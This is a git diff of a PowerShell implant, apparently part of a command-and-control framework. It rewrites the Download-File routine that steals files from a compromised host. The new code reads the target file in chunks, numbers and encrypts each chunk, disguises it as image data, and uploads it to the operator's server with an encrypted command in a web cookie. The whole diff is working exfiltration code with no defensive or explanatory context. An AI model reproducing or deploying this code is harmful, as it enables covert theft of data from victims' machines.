@@ -346,7 +346,8 @@ function Download-Files
 }
 function Get-RandomName 
 {
-    param (
+    param 
+    (
         [int]$Length
     )
     $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
@@ -362,35 +363,39 @@ function Download-File
         [string] $Source
     )
     try {
-    $Orig = $Source
-    $path = Resolve-PathSafe $Source
-    $randomname = Get-RandomName -Length 5
-    $fileonly = split-path $path -leaf
-    $fullnewname = $randomname + "_" + $fileonly
-    $chunkSize=10737418
-    $reader = [System.IO.File]::OpenRead($path)
-    $count = 0
-    $buffer = New-Object Byte[] $chunkSize
-    $hasMore = $true
-    while($hasMore)
-    {
-        $bytesRead = $reader.Read($buffer, 0, $buffer.Length)
-        $output = $buffer
-        if ($bytesRead -ne $buffer.Length)
-        {
-            $hasMore = $false
-            $output = New-Object Byte[] $bytesRead
-            [System.Array]::Copy($buffer, $output, $bytesRead)
-        }
+        $fileName = Resolve-PathSafe $Source
+        $randomName = Get-RandomName -Length 5
+        $fileExt = [System.IO.Path]::GetExtension($fileName)
+        $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
+        $fullNewname = "$($fileNameOnly)_$($randomName)$($fileExt)"
+        $bufferSize = 10737418;
 
-        $ReadCommand = "download-file "+$fullnewname
-        $ReadCommand = Encrypt-String $key $ReadCommand  
-        $send = Encrypt-String3 $key $output
-        $UploadBytes = getimgdata $send
-        (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
-        ++$count
-    }
-    $reader.Close()
+        $fs = [System.IO.File]::Open($fileName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite);        
+        $fileSize =(Get-Item $fileName).Length
+        
+        $chunkSize = $fileSize / $bufferSize
+        $totalChunks = [int][Math]::Ceiling($chunkSize)
+        if ($totalChunks -lt 1) {$totalChunks = 1}
+        $totalChunkStr = $totalChunks.ToString("00000")
+        $totalChunkByte = [System.Text.Encoding]::UTF8.GetBytes($totalChunkStr)
+        $Chunk = 1
+        $finfo = new-object System.IO.FileInfo ($fileName)
+        $size = $finfo.Length
+        $str = New-Object System.IO.BinaryReader($fs);
+        do {
+            $ChunkStr = $Chunk.ToString("00000")
+            $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
+            $preNumbers = New-Object byte[] 10
+            $preNumbers = ($ChunkedByte+$totalChunkByte)
+            $readSize = $bufferSize;
+            $chunkBytes = $str.ReadBytes($readSize);
+            $ReadCommand = "download-file "+$fullNewname
+            $ReadCommand = Encrypt-String $key $ReadCommand
+            $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
+            $UploadBytes = getimgdata $send
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+            ++$Chunk 
+        } until (($size -= $bufferSize) -le 0);
     } catch {
         $Output = "ErrorCmd: " + $error[0]
         $ReadCommand = "Error downloading file "+$fullnewname
@@ -398,7 +403,7 @@ function Download-File
         $send = Encrypt-String2 $key $output
         $UploadBytes = getimgdata $send
         (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
-    }
+    } 
 }
 function Posh-Delete
 {
